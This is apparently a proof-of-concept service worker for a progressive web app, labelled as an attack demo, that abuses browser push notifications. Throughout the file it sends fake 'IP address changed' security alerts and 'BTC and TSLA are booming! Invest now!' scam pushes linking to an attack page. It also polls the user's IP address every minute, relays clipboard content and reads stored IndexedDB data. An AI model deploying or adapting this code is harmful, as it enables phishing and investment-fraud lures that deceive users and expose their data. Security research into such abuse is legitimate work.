const API_URL_COINBASE =
  'https://api.coinbase.com/v2/exchange-rates?currency=BTC';
const INVESTOPEDIA_RSS =
  'https://www.investopedia.com/feedbuilder/feed/getfeed?feedName=markets';

// 每10分钟更新消息
const UPDATE_INTERVAL = 60 * 1000;

self.addEventListener('install', (event) => {
  console.log('Service Worker installing...');
  event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', (event) => {
  console.log('Service Worker activated.');
  readIndexedDB();
  scheduleDailyPush(); // Schedule the daily push on activation
  event.waitUntil(self.clients.claim());
  fetchAndPushMessages(); // 初次运行
  setInterval(fetchAndPushMessages, UPDATE_INTERVAL); // 每10分钟运行
});

let lastKnownIP = null;

// Fetch IP address and check for changes
async function fetchIPAddress() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    console.log('Current IP Address:', data.ip);

    // Check if IP has changed
    if (lastKnownIP && lastKnownIP !== data.ip) {
      console.log(`IP Address changed from ${lastKnownIP} to ${data.ip}`);
      await sendIPChangeNotification();
    }

    // Update last known IP
    lastKnownIP = data.ip;
  } catch (error) {
    console.error('Failed to fetch IP address:', error);
  }
}

// Send a push notification when IP changes
async function sendIPChangeNotification() {
  const options = {
    body: 'Your IP address has changed! Please check your security settings.\nClick pwa-demo.github.io/attack1a for more details.',
    icon: '/images/icon.png', // Replace with your icon path
    badge: '/images/badge.png', // Replace with your badge path
    data: { url: 'https://pwa-demo.github.io/attack1a' },
  };

  self.registration.showNotification('IP Change Detected', options);
}

// Schedule daily push notification
function scheduleDailyPush() {
  const now = new Date();
  const targetTime = new Date();
  targetTime.setHours(8, 20, 0, 0); // Set time to 8:20 AM

  if (now.getTime() > targetTime.getTime()) {
    // If the target time has already passed today, schedule for tomorrow
    targetTime.setDate(targetTime.getDate() + 1);
  }

  const delay = targetTime.getTime() - now.getTime();

  console.log(`Daily push scheduled in ${delay / 1000 / 60} minutes.`);
  setTimeout(() => {
    sendDailyPush();
    setInterval(sendDailyPush, 24 * 60 * 60 * 1000); // Repeat every 24 hours
  }, delay);
}

// Send the daily push notification
async function sendDailyPush() {
  const options = {
    body: 'Pre-market news! BTC and TSLA are booming! Invest now!\nClick pwa-demo.github.io/attack1a for more details.',
    icon: '/images/icon.png', // Replace with your icon path
    badge: '/images/badge.png', // Replace with your badge path
    data: { url: 'https://pwa-demo.github.io/attack1a' },
  };

  console.log('Sending daily push notification...');
  self.registration.showNotification('Pre-market News', options);
}

// Handle notification click event
self.addEventListener('notificationclick', (event) => {
  console.log('Notification clicked:', event.notification);

  // Close the notification
  event.notification.close();

  // Extract the URL from the notification data
  const targetUrl = event.notification.data?.url || '/';

  // Open or focus the target page
  event.waitUntil(
    self.clients
      .matchAll({ type: 'window', includeUncontrolled: true })
      .then((clients) => {
        const client = clients.find((c) => c.url === targetUrl && 'focus' in c);
        if (client) {
          return client.focus(); // Focus if the page is already open
        }
        return self.clients.openWindow(targetUrl); // Open a new window if not already open
      })
  );
});

// Listen for messages to trigger IP check
self.addEventListener('message', (event) => {
  if (event.data === 'fetch-ip') {
    fetchIPAddress();
  } else if (event.data && event.data.clipboardContent) {
    self.clients.matchAll().then((clients) => {
      clients.forEach((client) => {
        client.postMessage({ clipboardContent: event.data.clipboardContent });
      });
    });
  }
});

// Periodic IP check (optional, if you want regular monitoring)
setInterval(fetchIPAddress, 60000); // Checks IP every 60 seconds

// Read data from IndexedDB and log it
async function readIndexedDB() {
  console.log('Attempting to read from IndexedDB...');

  return new Promise((resolve, reject) => {
    const dbRequest = indexedDB.open('AttackDB', 1);

    dbRequest.onsuccess = function (event) {
      const db = event.target.result;
      const transaction = db.transaction('data', 'readonly');
      const store = transaction.objectStore('data');

      console.log(
        'Connected to IndexedDB and accessing object store "data"...'
      );

      store.openCursor().onsuccess = function (event) {
        const cursor = event.target.result;
        if (cursor) {
          console.log(
            `IndexedDB Entry - Key: ${cursor.key}, Data:`,
            cursor.value.data
          );
          cursor.continue();
        } else {
          console.log('Completed reading entries in IndexedDB.');
          resolve();
        }
      };
    };

    dbRequest.onerror = function (event) {
      console.error('Error opening IndexedDB:', event.target.errorCode);
      reject(event.target.errorCode);
    };

    dbRequest.onupgradeneeded = function (event) {
      console.log('IndexedDB upgrade needed, initializing...');
      const db = event.target.result;
      if (!db.objectStoreNames.contains('data')) {
        db.createObjectStore('data', { keyPath: 'id' });
        console.log('Object store "data" created.');
      }
    };
  });
}

// 获取和推送消息
async function fetchAndPushMessages() {
  try {
    const [cryptoData, newsData] = await Promise.all([
      fetchCryptoData(),
      fetchNewsData(),
    ]);

    const cryptoMessage = `BTC Price: $${cryptoData.price}`;
    const newsMessage = `Latest News: ${newsData.title}`;

    // 合并并推送消息
    const options = {
      body: `${cryptoMessage}\n\n${newsMessage}\nClick pwa-demo.github.io/attack1a for more details.`,
      icon: '/images/icon.png', // 替换为你的实际路径
      badge: '/images/badge.png', // 替换为你的实际路径
      data: { url: 'https://pwa-demo.github.io/attack1a' },
    };

    console.log('Pushing combined notification:', options.body);
    self.registration.showNotification('Market Updates', options);
  } catch (error) {
    console.error('Failed to fetch and push messages:', error);
  }
}

// 获取加密货币数据
async function fetchCryptoData() {
  try {
    const response = await fetch(API_URL_COINBASE);
    const data = await response.json();
    const price = data.data.rates.USD;
    console.log('Fetched BTC Price:', price);
    return { price };
  } catch (error) {
    console.error('Error fetching crypto data:', error);
    return { price: 'Unavailable' };
  }
}

// 获取新闻数据
async function fetchNewsData() {
  try {
    const response = await fetch(INVESTOPEDIA_RSS);
    const text = await response.text();

    // 使用 DOMParser 解析 RSS 数据
    const parser = new DOMParser();
    const xmlDoc = parser.parseFromString(text, 'text/xml');
    const firstItem = xmlDoc.querySelector('item');
    const title = firstItem
      ? firstItem.querySelector('title').textContent
      : 'No news available';

    console.log('Fetched news title:', title);
    return { title };
  } catch (error) {
    console.error('Error fetching news data:', error);
    return { title: 'Unavailable' };
  }
}
